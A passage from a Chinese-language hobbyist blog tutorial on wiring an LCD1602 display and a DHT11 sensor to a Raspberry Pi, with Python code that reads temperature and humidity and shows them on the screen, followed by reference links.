<p>VSS，接地，RPi PIN 6<br>VDD，接5V电源，PRi PIN 2<br>VO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9<br>RS，寄存器选择，接GPIO 14，RPi PIN 8<br>RW，读写选择，接地，表示写模式，PRi PIN 6<br>E，使能信号，接GPIO 15，RPi PIN 10<br>D0，数据位0，4位工作模式下不用，不接<br>D1，数据位1，4位工作模式下不用，不接<br>D2，数据位2，4位工作模式下不用，不接<br>D3，数据位3，4位工作模式下不用，不接<br>D4，数据位4，接GPIO 17，RPi PIN 11<br>D5，数据位5，接GPIO 18，RPi PIN 12<br>D6，数据位6，接GPIO 27，RPi PIN 13<br>D7，数据位7，接GPIO 22，RPi PIN 15<br>A，液晶屏背光+，接5V，RPi PIN 4<br>K，液晶屏背光-，接地，RPi PIN 39</p>
<p><strong>连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。</strong></p>
<p>建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。</p>
<h2 id="LCD1602-开机测试"><a href="#LCD1602-开机测试" class="headerlink" title="LCD1602 开机测试"></a>LCD1602 开机测试</h2><p>接通电源线，默认情况下，如果连接正确：</p>
<ul>
<li>肯定没有爆炸</li>
<li>会出现如下图的效果，证明你已经接线成功了<br><img src="/content/images/2016/08/1.jpg" alt=""></li>
</ul>
<h2 id="DHT11-接线方案"><a href="#DHT11-接线方案" class="headerlink" title="DHT11 接线方案"></a>DHT11 接线方案</h2><p>接线简单，主要是把数据传输到GPIO26上</p>
<p>DHT11有3个脚，VCC，DATA，GND<br>VCC 接 3.3V PIN 01<br>DATA 接 GPIO26 PIN 37<br>GND 接地  PIN 09</p>
<p>#代码<br>采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github</p>
<p><a href="https://github.com/yfgeek/rpi-TmpHmdRuntime" target="_blank" rel="external">https://github.com/yfgeek/rpi-TmpHmdRuntime</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="comment"># based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527</span></div><div class="line"><span class="comment"># rewrite by ivan</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"><span class="keyword">import</span> commands,time</div><div class="line"><span class="keyword">import</span> RPi.GPIO <span class="keyword">as</span> GPIO</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tmp</span><span class="params">()</span>:</span></div><div class="line">  channel = <span class="number">37</span></div><div class="line">  data = []</div><div class="line">  j = <span class="number">0</span></div><div class="line"></div><div class="line">  GPIO.setmode(GPIO.BOARD)</div><div class="line"></div><div class="line">  time.sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line">  GPIO.setup(channel, GPIO.OUT)</div><div class="line">  GPIO.output(channel, GPIO.LOW)</div><div class="line">  time.sleep(<span class="number">0.5</span>)</div><div class="line">  GPIO.output(channel, GPIO.HIGH)</div><div class="line">  GPIO.setup(channel, GPIO.IN)</div><div class="line"></div><div class="line">  <span class="keyword">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class="line">    <span class="keyword">continue</span></div><div class="line">  <span class="keyword">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class="line">    <span class="keyword">continue</span></div><div class="line"></div><div class="line">  <span class="keyword">while</span> j &lt; <span class="number">40</span>:</div><div class="line">    k = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class="line">      <span class="keyword">continue</span></div><div class="line">    <span class="keyword">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class="line">      k += <span class="number">1</span></div><div class="line">      <span class="keyword">if</span> k &gt; <span class="number">100</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> k &lt; <span class="number">8</span>:</div><div class="line">      data.append(<span class="number">0</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      data.append(<span class="number">1</span>)</div><div class="line"></div><div class="line">    j += <span class="number">1</span></div><div class="line"></div><div class="line">  <span class="keyword">print</span> <span class="string">"sensor is working."</span></div><div class="line">  <span class="keyword">print</span> data</div><div class="line"></div><div class="line">  humidity_bit = data[<span class="number">0</span>:<span class="number">8</span>]</div><div class="line">  humidity_point_bit = data[<span class="number">8</span>:<span class="number">16</span>]</div><div class="line">  temperature_bit = data[<span class="number">16</span>:<span class="number">24</span>]</div><div class="line">  temperature_point_bit = data[<span class="number">24</span>:<span class="number">32</span>]</div><div class="line">  check_bit = data[<span class="number">32</span>:<span class="number">40</span>]</div><div class="line"></div><div class="line">  humidity = <span class="number">0</span></div><div class="line">  humidity_point = <span class="number">0</span></div><div class="line">  temperature = <span class="number">0</span></div><div class="line">  temperature_point = <span class="number">0</span></div><div class="line">  check = <span class="number">0</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">    humidity += humidity_bit[i] * <span class="number">2</span> ** (<span class="number">7</span>-i)</div><div class="line">    humidity_point += humidity_point_bit[i] * <span class="number">2</span> ** (<span class="number">7</span>-i)</div><div class="line">    temperature += temperature_bit[i] * <span class="number">2</span> ** (<span class="number">7</span>-i)</div><div class="line">    temperature_point += temperature_point_bit[i] * <span class="number">2</span> ** (<span class="number">7</span>-i)</div><div class="line">    check += check_bit[i] * <span class="number">2</span> ** (<span class="number">7</span>-i)</div><div class="line"></div><div class="line">  tmp = humidity + humidity_point + temperature + temperature_point</div><div class="line"></div><div class="line">  <span class="keyword">if</span> check == tmp:</div><div class="line">    <span class="keyword">return</span> <span class="string">'temp:'</span> + str(temperature) + <span class="string">' C \nhumidity:'</span> + str(humidity) + <span class="string">'%'</span></div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    get_tmp()</div><div class="line"></div><div class="line">  GPIO.cleanup()    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adafruit_CharLCD</span>:</span></div><div class="line"></div><div class="line">    <span class="comment"># commands</span></div><div class="line">    LCD_CLEARDISPLAY            = <span class="number">0x01</span></div><div class="line">    LCD_RETURNHOME                  = <span class="number">0x02</span></div><div class="line">    LCD_ENTRYMODESET            = <span class="number">0x04</span></div><div class="line">    LCD_DISPLAYCONTROL          = <span class="number">0x08</span></div><div class="line">    LCD_CURSORSHIFT             = <span class="number">0x10</span></div><div class="line">    LCD_FUNCTIONSET             = <span class="number">0x20</span></div><div class="line">    LCD_SETCGRAMADDR            = <span class="number">0x40</span></div><div class="line">    LCD_SETDDRAMADDR            = <span class="number">0x80</span></div><div class="line"></div><div class="line">    <span class="comment"># flags for display entry mode</span></div><div class="line">    LCD_ENTRYRIGHT              = <span class="number">0x00</span></div><div class="line">    LCD_ENTRYLEFT               = <span class="number">0x02</span></div><div class="line">    LCD_ENTRYSHIFTINCREMENT     = <span class="number">0x01</span></div><div class="line">    LCD_ENTRYSHIFTDECREMENT     = <span class="number">0x00</span></div><div class="line"></div><div class="line">    <span class="comment"># flags for display on/off control</span></div><div class="line">    LCD_DISPLAYON               = <span class="number">0x04</span></div><div class="line">    LCD_DISPLAYOFF              = <span class="number">0x00</span></div><div class="line">    LCD_CURSORON                = <span class="number">0x02</span></div><div class="line">    LCD_CURSOROFF               = <span class="number">0x00</span></div><div class="line">    LCD_BLINKON                 = <span class="number">0x01</span></div><div class="line">    LCD_BLINKOFF                = <span class="number">0x00</span></div><div class="line"></div><div class="line">    <span class="comment"># flags for display/cursor shift</span></div><div class="line">    LCD_DISPLAYMOVE             = <span class="number">0x08</span></div><div class="line">    LCD_CURSORMOVE              = <span class="number">0x00</span></div><div class="line"></div><div class="line">    <span class="comment"># flags for display/cursor shift</span></div><div class="line">    LCD_DISPLAYMOVE             = <span class="number">0x08</span></div><div class="line">    LCD_CURSORMOVE              = <span class="number">0x00</span></div><div class="line">    LCD_MOVERIGHT               = <span class="number">0x04</span></div><div class="line">    LCD_MOVELEFT                = <span class="number">0x00</span></div><div class="line"></div><div class="line">    <span class="comment"># flags for function set</span></div><div class="line">    LCD_8BITMODE                = <span class="number">0x10</span></div><div class="line">    LCD_4BITMODE                = <span class="number">0x00</span></div><div class="line">    LCD_2LINE                   = <span class="number">0x08</span></div><div class="line">    LCD_1LINE                   = <span class="number">0x00</span></div><div class="line">    LCD_5x10DOTS                = <span class="number">0x04</span></div><div class="line">    LCD_5x8DOTS                 = <span class="number">0x00</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, pin_rs=<span class="number">8</span>, pin_e=<span class="number">10</span>, pins_db=[<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">15</span>], GPIO = None)</span>:</span></div><div class="line">        <span class="comment"># Emulate the old behavior of using RPi.GPIO if we haven't been given</span></div><div class="line">        <span class="comment"># an explicit GPIO interface to use</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> GPIO:</div><div class="line">            <span class="keyword">import</span> RPi.GPIO <span class="keyword">as</span> GPIO</div><div class="line">        GPIO.setwarnings(<span class="keyword">False</span>)</div><div class="line"></div><div class="line">        self.GPIO = GPIO</div><div class="line">        self.pin_rs = pin_rs</div><div class="line">        self.pin_e = pin_e</div><div class="line">        self.pins_db = pins_db</div><div class="line"></div><div class="line">        self.GPIO.setmode(GPIO.BOARD)</div><div class="line">        self.GPIO.setup(self.pin_e, GPIO.OUT)</div><div class="line">        self.GPIO.setup(self.pin_rs, GPIO.OUT)</div><div class="line"></div><div class="line">        <span class="keyword">for</span> pin <span class="keyword">in</span> self.pins_db:</div><div class="line">            self.GPIO.setup(pin, GPIO.OUT)</div><div class="line"></div><div class="line">        self.write4bits(<span class="number">0x33</span>) <span class="comment"># initialization</span></div><div class="line">        self.write4bits(<span class="number">0x32</span>) <span class="comment"># initialization</span></div><div class="line">        self.write4bits(<span class="number">0x28</span>) <span class="comment"># 2 line 5x7 matrix</span></div><div class="line">        self.write4bits(<span class="number">0x0C</span>) <span class="comment"># turn cursor off 0x0E to enable cursor</span></div><div class="line">        self.write4bits(<span class="number">0x06</span>) <span class="comment"># shift cursor right</span></div><div class="line"></div><div class="line">        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF</div><div class="line"></div><div class="line">        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS</div><div class="line">        self.displayfunction |= self.LCD_2LINE</div><div class="line"></div><div class="line">        <span class="string">""" Initialize to default text direction (for romance languages) """</span></div><div class="line">        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT</div><div class="line">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) <span class="comment">#  set the entry mode</span></div><div class="line"></div><div class="line">        self.clear()</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">begin</span><span class="params">(self, cols, lines)</span>:</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> (lines &gt; <span class="number">1</span>):</div><div class="line">                self.numlines = lines</div><div class="line">                self.displayfunction |= self.LCD_2LINE</div><div class="line">                self.currline = <span class="number">0</span></div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(self)</span>:</span></div><div class="line"></div><div class="line">        self.write4bits(self.LCD_RETURNHOME) <span class="comment"># set cursor position to zero</span></div><div class="line">        self.delayMicroseconds(<span class="number">3000</span>) <span class="comment"># this command takes a long time!</span></div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">(self)</span>:</span></div><div class="line"></div><div class="line">        self.write4bits(self.LCD_CLEARDISPLAY) <span class="comment"># command to clear display</span></div><div class="line">        self.delayMicroseconds(<span class="number">3000</span>)    <span class="comment"># 3000 microsecond sleep, clearing the display takes a long time</span></div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setCursor</span><span class="params">(self, col, row)</span>:</span></div><div class="line"></div><div class="line">        self.row_offsets = [ <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x14</span>, <span class="number">0x54</span> ]</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( row &gt; self.numlines ): </div><div class="line">                row = self.numlines - <span class="number">1</span> <span class="comment"># we count rows starting w/0</span></div><div class="line"></div><div class="line">        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">noDisplay</span><span class="params">(self)</span>:</span> </div><div class="line">        <span class="string">""" Turn the display off (quickly) """</span></div><div class="line"></div><div class="line">        self.displaycontrol &amp;= ~self.LCD_DISPLAYON</div><div class="line">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">""" Turn the display on (quickly) """</span></div><div class="line"></div><div class="line">        self.displaycontrol |= self.LCD_DISPLAYON</div><div class="line">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">noCursor</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">""" Turns the underline cursor on/off """</span></div><div class="line"></div><div class="line">        self.displaycontrol &amp;= ~self.LCD_CURSORON</div><div class="line">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cursor</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">""" Cursor On """</span></div><div class="line"></div><div class="line">        self.displaycontrol |= self.LCD_CURSORON</div><div class="line">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">noBlink</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">""" Turn on and off the blinking cursor """</span></div><div class="line"></div><div class="line">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class="line">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">noBlink</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">""" Turn on and off the blinking cursor """</span></div><div class="line"></div><div class="line">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class="line">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">DisplayLeft</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">""" These commands scroll the display without changing the RAM """</span></div><div class="line"></div><div class="line">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">scrollDisplayRight</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">""" These commands scroll the display without changing the RAM """</span></div><div class="line"></div><div class="line">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leftToRight</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">""" This is for text that flows Left to Right """</span></div><div class="line"></div><div class="line">        self.displaymode |= self.LCD_ENTRYLEFT</div><div class="line">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rightToLeft</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">""" This is for text that flows Right to Left """</span></div><div class="line">        self.displaymode &amp;= ~self.LCD_ENTRYLEFT</div><div class="line">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">autoscroll</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">""" This will 'right justify' text from the cursor """</span></div><div class="line"></div><div class="line">        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT</div><div class="line">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">noAutoscroll</span><span class="params">(self)</span>:</span> </div><div class="line">        <span class="string">""" This will 'left justify' text from the cursor """</span></div><div class="line"></div><div class="line">        self.displaymode &amp;= ~self.LCD_ENTRYSHIFTINCREMENT</div><div class="line">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write4bits</span><span class="params">(self, bits, char_mode=False)</span>:</span></div><div class="line">        <span class="string">""" Send command to LCD """</span></div><div class="line"></div><div class="line">        self.delayMicroseconds(<span class="number">1000</span>) <span class="comment"># 1000 microsecond sleep</span></div><div class="line"></div><div class="line">        bits=bin(bits)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</div><div class="line"></div><div class="line">        self.GPIO.output(self.pin_rs, char_mode)</div><div class="line"></div><div class="line">        <span class="keyword">for</span> pin <span class="keyword">in</span> self.pins_db:</div><div class="line">            self.GPIO.output(pin, <span class="keyword">False</span>)</div><div class="line"></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            <span class="keyword">if</span> bits[i] == <span class="string">"1"</span>:</div><div class="line">                self.GPIO.output(self.pins_db[::<span class="number">-1</span>][i], <span class="keyword">True</span>)</div><div class="line"></div><div class="line">        self.pulseEnable()</div><div class="line"></div><div class="line">        <span class="keyword">for</span> pin <span class="keyword">in</span> self.pins_db:</div><div class="line">            self.GPIO.output(pin, <span class="keyword">False</span>)</div><div class="line"></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>,<span class="number">8</span>):</div><div class="line">            <span class="keyword">if</span> bits[i] == <span class="string">"1"</span>:</div><div class="line">                self.GPIO.output(self.pins_db[::<span class="number">-1</span>][i<span class="number">-4</span>], <span class="keyword">True</span>)</div><div class="line"></div><div class="line">        self.pulseEnable()</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delayMicroseconds</span><span class="params">(self, microseconds)</span>:</span></div><div class="line">        seconds = microseconds / float(<span class="number">1000000</span>) <span class="comment"># divide microseconds by 1 million for seconds</span></div><div class="line">        sleep(seconds)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pulseEnable</span><span class="params">(self)</span>:</span></div><div class="line">        self.GPIO.output(self.pin_e, <span class="keyword">False</span>)</div><div class="line">        self.delayMicroseconds(<span class="number">1</span>)               <span class="comment"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class="line">        self.GPIO.output(self.pin_e, <span class="keyword">True</span>)</div><div class="line">        self.delayMicroseconds(<span class="number">1</span>)               <span class="comment"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class="line">        self.GPIO.output(self.pin_e, <span class="keyword">False</span>)</div><div class="line">        self.delayMicroseconds(<span class="number">1</span>)               <span class="comment"># commands need &gt; 37us to settle</span></div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">(self, text)</span>:</span></div><div class="line">        <span class="string">""" Send string to LCD. Newline wraps to second line"""</span></div><div class="line"></div><div class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> text:</div><div class="line">            <span class="keyword">if</span> char == <span class="string">'\n'</span>:</div><div class="line">                self.write4bits(<span class="number">0xC0</span>) <span class="comment"># next line</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                self.write4bits(ord(char),<span class="keyword">True</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line"></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        tmp = get_tmp() </div><div class="line">        <span class="keyword">if</span> tmp:</div><div class="line">            lcd = Adafruit_CharLCD()</div><div class="line">            lcd.noBlink()</div><div class="line">            lcd.clear()</div><div class="line">            lcd.message(tmp)</div><div class="line">        sleep(<span class="number">5</span>)</div></pre></td></tr></table></figure></p>
<h1 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h1><p><img src="/content/images/2016/08/WechatIMG302.jpeg" alt=""></p>
<p><img src="/content/images/2016/08/WechatIMG293.jpeg" alt=""></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://gist.github.com/hugozhu/6166527" target="_blank" rel="external">https://gist.github.com/hugozhu/6166527</a><br><a href="https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f" target="_blank" rel="external">https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f</a><br><a href="https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py" target="_blank" rel="external">https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py</a><br><a href="http://blog.csdn.net/xukai871105/article/details/12684617" target="_blank" rel="external">http://blog.csdn.net/xukai871105/article/details/12684617</a><br><a href="https://www.oschina.net/question/1425530\_140979" target="_blank" rel="external">https://www.oschina.net/question/1425530\_140979</a><br><a href="http://bbs.elecfans.com/jishu\_578437\_1\_1.html" target="_blank" rel="external">http://bbs.elecfans.com/jishu\_578437\_1\_1.html</a><br><a href="http://blog.csdn.net/netccy/article/details/48098455" target="_blank" rel="external">http://blog.csdn.net/netccy/article/details/48098455</a><br><a href="https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html" target="_blank" rel="external">https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html</a><br><a href="http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html" target="_blank" rel="external">http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html</a><br><a href="http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html" target="_blank" rel="external">http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html</a><br><a href="http://blog.csdn.net/rocklee/article/details/50082777" target="_blank" rel="external">http://blog.csdn.net/rocklee/article/details/50082777</a><br><a href="http://www.guokr.com/post/718305/" target="_blank" rel="external">http://www.guokr.com/post/718305/</a><br><a href="http://www.rs-online.com/designspark/electronics/blog/content-1148" target="_blank" rel="external">http://www.rs-online.com/designspark/electronics/blog/content-1148</a><br><a href="http://bbs.elecfans.com/jishu\_582479\_1\_1.html" target="_blank" rel="external">http://bbs.elecfans.com/jishu\_582479\_1\_1.html</a><br><a href="https://www.freemindworld.com/blog/2013/130310\_raspberry\_pi\_with\_lcd.shtml" target="_blank" rel="external">https://www.freemindworld.com/blog/2013/130310\_raspberry\_pi\_with\_lcd.shtml</a><br><a href="http://blog.csdn.net/u013431550/article/details/40870947" target="_blank" 